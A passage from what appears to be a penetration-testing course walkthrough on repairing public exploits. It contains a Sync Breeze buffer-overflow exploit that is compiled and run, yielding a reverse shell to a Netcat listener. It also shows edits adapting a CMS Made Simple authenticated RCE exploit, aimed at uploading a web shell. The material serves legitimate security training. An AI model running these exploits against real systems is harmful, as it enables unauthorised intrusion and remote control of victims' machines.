### Exploit Code Analysis and Compilation

```c
int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
char *content_length_string = malloc(15);
sprintf(content_length_string, "%d", content_length);

int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);

strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);
strcat(buffer, retn);
strcat(buffer, shellcode);
strcat(buffer, request_three);

SendRequest(buffer, strlen(buffer));
}
int main() {
    EvilRequest();
    return 0;
}
```

**Listing 323 - Exploit code following the socket information, return address instruction, and payload changes**

Let's compile the exploit code using `mingw-w64` to determine if it generates any errors.

```bash
kali@kali:~/Desktop$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
kali@kali:~/Desktop$ ls -lah
total 372K
drwxr-xr-x 2 kali kali 4.0K Feb 24 17:14 .
drwxr-xr-x 17 kali kali 4.0K Feb 24 15:42 ..

-rwxr-xr-x 1 kali kali 355K Feb 24 17:14 syncbreeze_exploit.exe
```

**Listing 324 - Compiling the modified exploit code using mingw-64**

Now that we have an updated, clean-compiling exploit, we can test it out. We’ll return to Immunity Debugger with Sync Breeze attached and press `F9`, follow the JMP ESP address at `0x10090c83`, and press `F2` to set a breakpoint on it.

**Figure 224: Setting a breakpoint at our JMP ESP address**

Once our breakpoint has been set in the debugger, we can let the application run normally and attempt to execute our exploit from Kali.

```bash
kali@kali:~/Desktop$ sudo wine syncbreeze_exploit.exe
[>] Initialising Winsock...
[>] Initialised.
[>] Socket created.
[>] Connected
[>] Request sent
```

**Listing 325 - Running the Windows exploit using wine**

Surprisingly, we do not hit our breakpoint at all. Instead, the application crashes and the EIP register seems to be overwritten by `0x9010090c`.

**Figure 225: EIP is overwritten by our return address instruction address misaligned by one byte**

By analyzing both the value stored in EIP (`0x9010090c`) and the buffer sent to the target application, we’ll notice that our offset to overwrite the return address on the stack seems to be off by one byte. The wrong offset forces the CPU to POP a different return address from the stack rather than the intended one (`0x10090c83`). We’ll examine this discrepancy in the next section.

### Changing the Overflow Buffer

Let’s try to understand our offset misalignment. Reviewing the first part of our large padding buffer of “A” characters, we’ll notice that it starts with a call to `malloc` with the size 780:

```c
int initial_buffer_size = 780;
char *padding = malloc(initial_buffer_size);
```

**Listing 326 - Allocating memory for the initial buffer using malloc**

This number should seem familiar. In the beginning of this module, we noted that 780 is the offset in bytes required to overwrite the return address on the stack and take control of the EIP register.

The `malloc` function only allocates a block of memory based on the requested size. This buffer needs to be properly initialized, which is done using the `memset` function right after the call to `malloc`.

```c
memset(padding, 0x41, initial_buffer_size);
```

**Listing 327 - Filling the initial buffer with “A” characters**

Using `memset` will fill the memory allocation with a particular character, in our case `0x41`, the hex representation of the “A” character in ASCII.

The next line of code in the exploit is particularly interesting. We find a call to `memset`, which sets the last byte in the allocation to a NULL byte.

```c
memset(padding + initial_buffer_size - 1, 0x00, 1);
```

**Listing 328 - Memset setting the last byte to a null-terminator to convert the buffer into a string**

This may seem confusing at first; however, continuing to read the code, we arrive at the lines where the final buffer is created.

```c
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);
strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);
strcat(buffer, retn);
strcat(buffer, shellcode);
strcat(buffer, request_three);
```

**Listing 329 - Creating the final buffer for the exploit**

The code starts by allocating a memory block for the buffer character array using `malloc`, then filling the array with NULL bytes. Next, the code fills the buffer character array by copying the content of the other variables through various string manipulation functions such as `strcpy` and `strcat`.

Knowing the final buffer must be constructed as a string is very important. The C programming language makes use of null-terminated strings, meaning that functions such as `strcpy` and `strcat` determine the end and the size of a string by searching for the first occurrence of a NULL byte in the target character array. Since the allocation size of our initial padding buffer is 780, by setting the last byte to `0x00`, we end up concatenating (using `strcat`) a string of “A” ASCII characters that is 779 bytes in length. This explains the misaligned overwrite of EIP.

We can quickly fix this misalignment by increasing the requested memory size defined by the `initial_buffer_size` variable by 1.

```c
int initial_buffer_size = 781;
char *padding = malloc(initial_buffer_size);
memset(padding, 0x41, initial_buffer_size);
memset(padding + initial_buffer_size - 1, 0x00, 1);
```

**Listing 330 - Changing the padding allocation size**

As a final test, we will again compile the code, set up a Netcat listener on port 443 to catch our reverse shell, and, after making sure the Sync Breeze service is running on the target machine, launch the exploit.

```bash
kali@kali:~/Desktop$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
kali@kali:~$ sudo nc -lvp 443
listening on [any] 443 ...
```

**Listing 331 - Compiling the exploit and setting up a Netcat listener on port 443**

Next, we will run the exploit:

```bash
kali@kali:~/Desktop$ wine syncbreeze_exploit.exe
[>] Initialising Winsock...
[>] Initialised.
[>] Socket created.
[>] Connected
[>] Request sent
```

**Listing 332 - Running the final version of the exploit**

Finally, we’ll switch to our Netcat listener.

```bash
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 49662
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

**Listing 333 - Receiving a reverse shell on our Kali Linux machine**

Excellent! We have a shell. In addition, this exploit no longer requires access to a Windows-based attack platform in the field, since we can run it from Kali.

### Fixing Web Exploits

This Learning Unit covers the following Learning Objectives:
- Fix web application exploits
- Troubleshoot common web application exploit issues

Web application vulnerabilities do not often result in memory corruption. Since they are not affected by protections provided by the operating system such as DEP and ASLR, they are significantly easier to repurpose. However, as we’ve learned during previous modules, web application vulnerabilities can often lead to database information leaks or even full control of the underlying system.

#### Considerations and Overview

Even if we might not have to deal with hex-encoded payloads in web exploits, it is important to properly read the code and understand what considerations must be taken in our editing process. When modifying web exploits, there are several key questions we generally need to ask while approaching the code:
- Does it initiate an HTTP or HTTPS connection?
- Does it access a specific web application path or route?
- Does the exploit leverage a pre-authentication vulnerability?
- If not, how does the exploit authenticate to the web application?
- How are the GET or POST requests crafted to trigger and exploit the vulnerability? Is there any HTTP method involved?
- Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
- Will oddities such as self-signed certificates disrupt the exploit?

We must also remember that public web application exploits do not take into account additional protections such as `.htaccess` files or Web Application Firewalls (WAF). This is mainly because the exploit author cannot possibly know about all these protections during the development process, making them out of scope.

#### Selecting the Vulnerability and Fixing the Code

Let’s consider the following scenario: during an assessment, we discover a Linux host with an exposed Apache2 server. After enumerating the web server, we discover an installation of CMS Made Simple version 2.2.5 listening on TCP port 443. This version appears to be vulnerable to remote code execution with a public exploit available on Exploit-DB.

Although this vulnerability is post-authentication, we discovered valid application credentials (admin / HUYfaw763) on another machine during the enumeration process.

Our plan is to adapt the generic public exploit to our target, obtain remote code execution, and ultimately upload a web shell that gives us control of the server.

As we inspect the code, we realize the `base_url` variable needs to be changed to match our environment.

```python
base_url = "http://192.168.1.10/cmsms/admin"
```

**Listing 334 - base_url variable as defined in the original exploit**

Let’s modify the IP address and the protocol to HTTPS to reflect our Debian VM target:

```python
base_url = "https://192.168.50.120/admin"
```

**Listing 335 - base_url variable updated to match our case**

We also notice that, while browsing the target website, we’re presented with a `SEC_ERROR_UNKNOWN_ISSUER` error. This error indicates that the certificate on the remote host cannot be validated. We’ll need to account for this in the exploit code.

Specifically, the exploit is using the `requests` Python library to communicate with the target. The code makes three POST requests on lines 34, 55, and 80:

```python
response = requests.post(url, data=data, allow_redirects=False)
response = requests.post(url, data=data, files=txt, cookies=cookies)
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
```

**Listing 336 - All three POST requests as defined in the original exploit**

Moreover, the official documentation indicates that the SSL certificate will be ignored if we set the `verify` parameter to `False`.

```python
response = requests.post(url, data=data, allow_redirects=False, verify=False)
response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
```

**Listing 337 - Modified POST requests to ignore SSL verification.**

Finally, we also need to change the credentials used in the original exploit to match those found during the enumeration process. These are defined in the `username` and `password` variables at lines 15 and 16, respectively.

```python
username = "admin"
password = "password"
```

**Listing 338 - username and password variables as defined in the original exploit**

We can easily replace these credentials.

```python
username = "admin"
password = "HUYfaw763"
```

**Listing 339 - username and password variables updated to match our scenario**

In this case, we do not need to update the simple payload since it only executes system commands passed in clear text within the GET request.

After all edits are complete, the final exploit should appear as follows:

```python
# Exploit Title: CMS Made Simple 2.2.5 authenticated Remote Code Execution

# Exploit Author: Mustafa Hasan (@strukt93)

import requests
import base64

base_url = "https://10.11.0.128/admin"
upload_dir = "/uploads"
upload_url = base_url.split('/admin')[0] + upload_dir
username = "admin"
password = "HUYfaw763"
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
```
